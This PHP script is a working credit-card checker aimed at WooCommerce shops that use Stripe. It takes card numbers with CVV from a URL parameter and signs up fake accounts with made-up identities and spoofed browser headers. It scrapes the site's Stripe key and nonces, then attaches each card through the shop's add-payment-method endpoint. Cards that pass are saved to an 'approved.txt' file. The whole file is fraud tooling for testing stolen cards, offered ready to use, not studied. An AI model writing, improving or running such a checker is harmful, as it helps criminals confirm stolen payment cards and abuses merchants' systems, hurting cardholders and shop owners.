<?php
// Set headers and error reporting
header('Content-Type: application/json');
error_reporting(0); // Suppress DOMDocument HTML5 parsing warnings

// --- Helper Functions ---

/**
 * Generates a random string.
 */
function generateRandomString($length = 10) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyz', ceil($length/strlen($x)) )),1,$length);
}

/**
 * Extracts a value from an HTML input field using regex.
 */
function extractValue($html, $name) {
    if (preg_match('/name="' . $name . '" value="([^"]+)"/', $html, $matches)) {
        return $matches[1];
    }
    return null;
}

/**
 * Cleans and validates a site URL.
 */
function cleanSiteUrl($site) {
    $site = preg_replace('/^https?:\/\//', '', $site);
    $site = preg_replace('/^www\./', '', $site);
    return trim($site, '/'); 
}

/**
 * Parses card details from CC|MM|YY|CVV format.
 */
function parseCardDetails($cc) {
    $parts = explode('|', $cc);
   
    if (count($parts) < 4) {
        return false;
    }
    
    $cardNumber = $parts[0];
    $expMonth = $parts[1];
    $expYear = $parts[2];
    $cvv = $parts[3];
    
    if (strlen($expYear) == 2) {
        $expYear = '20' . $expYear;
    }
    
    return [
        'number' => $cardNumber,
        'exp_month' => $expMonth,
        'exp_year' => $expYear,
        'cvv' => $cvv
    ];
}

/**
 * Extracts a descriptive message from a JSON response.
 */
function extractMessage($response, $responseData) {
    $message = 'Unknown error';
    if (isset($responseData['data']['error']['message'])) {
        $message = $responseData['data']['error']['message'];
    } elseif (isset($responseData['error']['message'])) {
        $message = $responseData['error']['message'];
    } elseif (isset($responseData['message'])) {
        $message = $responseData['message'];
    } elseif (isset($responseData['data']['message'])) {
        $message = $responseData['data']['message'];
    } else {
        if (preg_match('/"message":\s*"([^"]+)"/', $response, $matches)) {
            $message = $matches[1];
        }
    }
    
    return $message;
}

/**
 * Returns a JSON response and cleans up the cookie file.
 */
function returnResponse($response, $status, $message, $cookie_file = null) {
    if ($cookie_file && file_exists($cookie_file)) {
        @unlink($cookie_file);
    }
    
    echo json_encode([
        'response' => $response,
        'status' => $status,
        'message' => $message
    ]);
    exit; 
}

/**
 * Dynamically builds registration POST data by parsing the HTML form.
 */
function buildRegistrationData($htmlResponse) {
    $postData = [];
    $randomEmail = generateRandomString() . "@gmail.com";
    $randomPassword = generateRandomString(12) . '!A1';

    $dom = new DOMDocument();
    libxml_use_internal_errors(true);
    $dom->loadHTML($htmlResponse);
    libxml_clear_errors();
    $xpath = new DOMXPath($dom);

    $submitButton = $xpath->query('//input[@name="register"] | //button[@name="register"]')->item(0);
    if (!$submitButton) {
        return 'submit_missing'; 
    }

    $form = $submitButton->parentNode;
    while ($form && $form->nodeName !== 'form') {
        $form = $form->parentNode;
    }

    if (!$form) {
        return false;
    }

    $inputs = $xpath->query('.//input | .//select', $form);
    foreach ($inputs as $input) {
        $name = $input->getAttribute('name');
        if (empty($name)) {
            continue;
        }

        $value = $input->getAttribute('value');
        $type = $input->getAttribute('type');

        switch (strtolower($name)) {
            case 'email':
            case 'reg_email':
                $postData[$name] = $randomEmail;
                break;
            
            // --- START FIX: Handle 'username' field ---
            case 'username': 
            case 'reg_username':
                $postData[$name] = $randomEmail;
                break;
            // --- END FIX ---
            
            case 'password':
            case 'reg_password':
                $postData[$name] = $randomPassword;
                break;

            case 'first_name':
                $postData[$name] = 'John';
                break;
            
            case 'last_name':
                $postData[$name] = 'Doe';
                break;
            
            case 'addr1':
            case 'address':
            case 'billing_address_1':
                $postData[$name] = '123 Main St';
                break;
            
            case 'addr2':
            case 'address_2':
            case 'billing_address_2':
                $postData[$name] = 'Apt 4B';
                break;
            case 'city':
            case 'billing_city':
                $postData[$name] = 'New York';
                break;

            case 'thestate':
            case 'state':
            case 'billing_state':
                $postData[$name] = 'NY';
                break;

            case 'zip':
            case 'postcode':
            case 'billing_postcode':
                $postData[$name] = '10001';
                break;
            
            case 'country':
            case 'billing_country':
                $postData[$name] = 'US';
                break;
            
            case 'phone':
            case 'phone1':
            case 'billing_phone':
                $postData[$name] = '2125551234';
                break;
            
            default:
                if ($type === 'hidden' || $name === 'register' || strpos($name, 'nonce') !== false || strpos($name, 'referer') !== false) {
                    $postData[$name] = $value;
                }
                break;
        }
    }
    
    $otherInputs = $xpath->query('//input[@type="hidden"]');
    foreach ($otherInputs as $input) {
        $name = $input->getAttribute('name');
        if (empty($name) || isset($postData[$name])) {
            continue;
        }
        if (strpos($name, 'wc_order_attribution_') === 0 || $name === 'mailchimp_woocommerce_newsletter') {
             $postData[$name] = $input->getAttribute('value');
        }
    }

    if (!isset($postData['register'])) {
        $postData['register'] = $submitButton->getAttribute('value') ?: 'Register';
    }
    
    if (empty($postData['woocommerce-register-nonce']) && empty($postData['_wpnonce'])) {
        foreach ($postData as $key => $val) {
            if (strpos($key, 'nonce') !== false) {
                return $postData; 
            }
        }
        return 'nonce_missing';
    }

    return $postData;
}


// --- Main Script Execution ---

if (!isset($_GET['site']) || !isset($_GET['cc'])) {
    returnResponse('Error', 'Error', 'Missing site or cc parameter');
}

$siteUrl = cleanSiteUrl($_GET['site']);
$cardDetails = parseCardDetails($_GET['cc']);
if (!$cardDetails) {
    returnResponse('Error', 'Error', 'Invalid card format');
}

$user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0'
];
$randomUserAgent = $user_agents[array_rand($user_agents)];
$cookie_file = 'cookie_' . uniqid() . '.txt'; 

$accountPageUrl = 'https://' . $siteUrl . '/my-account/';
$paymentPageUrl = 'https://' . $siteUrl . '/my-account/add-payment-method/';

try {
    // STEP 1: VISIT THE "MY ACCOUNT" PAGE TO GET THE REGISTRATION FORM
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $accountPageUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($ch, CURLOPT_USERAGENT, $randomUserAgent);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    $step1Headers = [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: en-US,en;q=0.9',
        'Upgrade-Insecure-Requests: 1',
        'Referer: https://' . $siteUrl . '/',
        'Sec-Ch-Ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
        'Sec-Ch-Ua-Mobile: ?0',
        'Sec-Ch-Ua-Platform: "Windows"',
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-User: ?1'
    ];
    curl_setopt($ch, CURLOPT_HTTPHEADER, $step1Headers);

    $htmlResponse = curl_exec($ch);
    if (curl_error($ch)) {
        curl_close($ch);
        returnResponse('Error', 'Error', 'Failed to connect to site: ' . curl_error($ch), $cookie_file);
    }
    curl_close($ch);

    // STEP 2: PARSE FORM AND REGISTER A NEW USER
    $postData = buildRegistrationData($htmlResponse);
    if ($postData === false) {
        returnResponse('Error', 'Error', 'Could not find registration form', $cookie_file);
    }
    if ($postData === 'nonce_missing') {
        returnResponse('Error', 'Error', 'Could not find registration nonce', $cookie_file);
    }
    if ($postData === 'submit_missing') {
        returnResponse('Error', 'Error', 'Could not find registration submit button. HTML Received (first 5000 chars): ' . htmlspecialchars(substr($htmlResponse, 0, 5000)), $cookie_file);
    }

    $postFields = http_build_query($postData);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $accountPageUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($ch, CURLOPT_USERAGENT, $randomUserAgent);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://' . $siteUrl,
        'Referer: ' . $accountPageUrl 
    ]);
    $registrationResponse = curl_exec($ch);
    
    if (curl_error($ch)) {
        curl_close($ch);
        returnResponse('Error', 'Error', 'Registration request failed', $cookie_file);
    }
    curl_close($ch);

    if (stripos($registrationResponse, 'Log out') === false && stripos($registrationResponse, 'Logout') === false && stripos($registrationResponse, 'dashboard') === false) {
        $regDom = new DOMDocument();
        @$regDom->loadHTML($registrationResponse);
        $regXpath = new DOMXPath($regDom);
        $errorNode = $regXpath->query('//ul[contains(@class, "woocommerce-error")]/li')->item(0);
        $regError = 'Registration failed or user not logged in';
        if ($errorNode) {
            $regError = trim($errorNode->nodeValue);
        }
        returnResponse('Error', 'Error', $regError, $cookie_file);
    }

    sleep(rand(1, 3));

    // STEP 3: VISIT THE "ADD PAYMENT METHOD" PAGE TO GET TOKENS
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $paymentPageUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($ch, CURLOPT_USERAGENT, $randomUserAgent);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    
    // --- START FIX: Use the same advanced headers from STEP 1 ---
    $step3Headers = $step1Headers;
    $step3Headers[] = 'Referer: ' . $accountPageUrl; // Refer from my-account
    curl_setopt($ch, CURLOPT_HTTPHEADER, $step3Headers);
    // --- END FIX ---
    
    $paymentPageHtml = curl_exec($ch);
    
    if (curl_error($ch)) {
        curl_close($ch);
        returnResponse('Error', 'Error', 'Failed to access payment page', $cookie_file);
    }
    curl_close($ch);

    // --- START DYNAMIC PLUGIN DETECTION ---
    
    $pluginMode = null;
    $ajaxNonce = null;
    $stripePublicKey = null;

    if (preg_match('/"createAndConfirmSetupIntentNonce":"([^"]+)"/', $paymentPageHtml, $matches)) {
        $pluginMode = 'STRIPE_GATEWAY';
        $ajaxNonce = $matches[1];
    
    } elseif (preg_match('/"create_setup_intent_nonce":"([^"]+)"/', $paymentPageHtml, $matches)) {
        $pluginMode = 'WOO_PAYMENTS';
        $ajaxNonce = $matches[1];
        
    } elseif (preg_match('/"ajax_nonce":"([^"]+)"/', $paymentPageHtml, $matches)) {
        $pluginMode = 'WOO_PAYMENTS';
        $ajaxNonce = $matches[1];
    }
    
    if (preg_match('/"key":\s*"([^"]+)"/', $paymentPageHtml, $keyMatches)) {
        $stripePublicKey = $keyMatches[1];
    } elseif (preg_match('/"publishableKey":\s*"([^"]+)"/', $paymentPageHtml, $keyMatches)) {
        $stripePublicKey = $keyMatches[1];
    } else {
        returnResponse('Error', 'Error', 'Could not find Stripe Public Key. HTML Received (first 3000 chars): ' . htmlspecialchars(substr($paymentPageHtml, 0, 3000)), $cookie_file);
    }
    
    $stripeAccountId = null;
    if (preg_match('/"accountId":\s*"([^"]+)"/', $paymentPageHtml, $accountMatches)) {
        $stripeAccountId = $accountMatches[1];
    } else {
        if ($pluginMode === 'WOO_PAYMENTS') {
            returnResponse('Error', 'Error', 'Could not find Stripe Account ID (accountId). HTML: ' . htmlspecialchars(substr($paymentPageHtml, 0, 3000)), $cookie_file);
        }
    }
    
    if (!$pluginMode || !$ajaxNonce) {
        returnResponse('Error', 'Error', 'Could not determine payment plugin or find AJAX nonce. HTML: ' . htmlspecialchars(substr($paymentPageHtml, 0, 2000)), $cookie_file);
    }
    
    // --- END DETECTION ---

    sleep(rand(1, 3));
    
    $registrationEmail = $postData['email'] ?? $postData['reg_email'] ?? $postData['username'];

    // STEP 4: CREATE A STRIPE PAYMENT METHOD TOKEN
    $stripePostData = http_build_query([
        'type' => 'card',
        'billing_details[email]' => $registrationEmail,
        'billing_details[name]' => 'John Doe', 
        'billing_details[address][country]' => 'US', 
        'card[number]' => $cardDetails['number'],
        'card[cvc]' => $cardDetails['cvv'],
        'card[exp_month]' => $cardDetails['exp_month'],
        'card[exp_year]' => substr($cardDetails['exp_year'], -2),
        'guid' => generateRandomString(8) . '-' . generateRandomString(4) . '-' . generateRandomString(4) . '-' . generateRandomString(12),
        'muid' => generateRandomString(8) . '-' . generateRandomString(4) . '-' . generateRandomString(4) . '-' . generateRandomString(12),
        'sid' => generateRandomString(8) . '-' . generateRandomString(4) . '-' . generateRandomString(4) . '-' . generateRandomString(12),
        'key' => $stripePublicKey,
        'payment_user_agent' => 'stripe.js/2a60804053; stripe-js-v3/2a60804053; payment-element' 
    ]);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $stripePostData);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);

    $stripeHeaders = [
        'Content-Type: application/x-www-form-urlencoded',
        'Accept: application/json',
        'Origin: https://js.stripe.com',
        'Referer: https://js.stripe.com/'
    ];
    if ($stripeAccountId) {
        $stripeHeaders[] = '_stripe_account: ' . $stripeAccountId;
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, $stripeHeaders);

    $stripeResponse = curl_exec($ch);
    
    if (curl_error($ch)) {
        curl_close($ch);
        returnResponse('Declined', 'Declined', 'Network error occurred', $cookie_file);
    }
    curl_close($ch);

    $stripeData = json_decode($stripeResponse, true);
    if (!isset($stripeData['id'])) {
        $errorMessage = 'Payment method creation failed';
        if (isset($stripeData['error'])) {
            $errorMessage = extractMessage($stripeResponse, $stripeData);
        }
        returnResponse('Declined', 'Declined', $errorMessage, $cookie_file);
    }
    $paymentMethodId = $stripeData['id'];

    // --- START: STEP 5 - DYNAMIC AJAX CALL ---
    $ch = curl_init();
    
    if ($pluginMode === 'STRIPE_GATEWAY') {
        $ajaxUrl = 'https://' . $siteUrl . '/?wc-ajax=wc_stripe_create_and_confirm_setup_intent';
        $finalPostData = http_build_query([
            'action' => 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method' => $paymentMethodId,
            'wc-stripe-payment-type' => 'card',
            'woocommerce_add_payment_method' => 1,
            '_ajax_nonce' => $ajaxNonce
        ]);
        
        curl_setopt($ch, CURLOPT_URL, $ajaxUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $finalPostData);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With: XMLHttpRequest',
            'Origin: https://' . $siteUrl,
            'Referer: ' . $paymentPageUrl
        ]);

    } elseif ($pluginMode === 'WOO_PAYMENTS') {
        $ajaxUrl = 'https://' . $siteUrl . '/wp-admin/admin-ajax.php';
        $finalPostData = [
            'action' => 'create_setup_intent',
            'wcpay-payment-method' => $paymentMethodId,
            '_ajax_nonce' => $ajaxNonce
        ];
        
        curl_setopt($ch, CURLOPT_URL, $ajaxUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $finalPostData); 
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'X-Requested-With: XMLHttpRequest',
            'Origin: https://' . $siteUrl,
            'Referer: ' . $paymentPageUrl
        ]);
    }
    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, $randomUserAgent);

    $finalResponse = curl_exec($ch);
    // --- END AJAX CALL ---
    
    if (curl_error($ch)) {
        curl_close($ch);
        returnResponse('Declined', 'Declined', 'Connection error', $cookie_file);
    }
    curl_close($ch);

    // ANALYZE FINAL RESPONSE
    $responseData = json_decode($finalResponse, true);
    $actualMessage = extractMessage($finalResponse, $responseData);

    if (isset($responseData['success']) && $responseData['success'] === true) {
        if (isset($responseData['data']['status'])) {
            $status = $responseData['data']['status'];
            if ($status === 'succeeded') {
                if ($actualMessage === 'Unknown error') {
                    $actualMessage = 'Payment method added successfully';
                }
                $ccString = $cardDetails['number'] . '|' . $cardDetails['exp_month'] . '|' . $cardDetails['exp_year'] . '|' . $cardDetails['cvv'];
                file_put_contents('approved.txt', $ccString . "\n", FILE_APPEND | LOCK_EX);
                returnResponse('Succeeded', 'Approved', $actualMessage, $cookie_file);
            } elseif (isset($responseData['data']['next_action']) && $responseData['data']['next_action'] !== null) {
                if ($actualMessage === 'Unknown error') {
                    $actualMessage = '3D Secure authentication required';
                }
                returnResponse('3D', '3D', $actualMessage, $cookie_file);
            }
        }
        if (isset($responseData['data']['redirect_url'])) {
             returnResponse('Succeeded', 'Approved', 'Payment method added successfully', $cookie_file);
        }
    }
    
    if (strpos($finalResponse, 'action_required') !== false ||
        strpos($finalResponse, 'requires_action') !== false ||
        (isset($responseData['data']['next_action']) && $responseData['data']['next_action'] !== null)) {
        
        if ($actualMessage === 'Unknown error') {
            $actualMessage = '3D Secure authentication required';
        }
        returnResponse('3D', '3D', $actualMessage, $cookie_file);
    }
    
    if (isset($responseData['success']) && $responseData['success'] === false) {
        returnResponse('Declined', 'Declined', $actualMessage, $cookie_file);
    }
    
    if (strpos(strtolower($finalResponse), 'declined') !== false ||
        strpos(strtolower($finalResponse), 'insufficient') !== false) {
        returnResponse('Declined', 'Declined', $actualMessage, $cookie_file);
    }
    
    if ($actualMessage === 'Unknown error') {
        $actualMessage = 'Payment processing failed';
    }
    returnResponse('Declined', 'Declined', $actualMessage, $cookie_file);

} catch (Exception $e) {
    returnResponse('Error', 'Error', 'An error occurred: ' . $e->getMessage(), isset($cookie_file) ? $cookie_file : null);
}
?>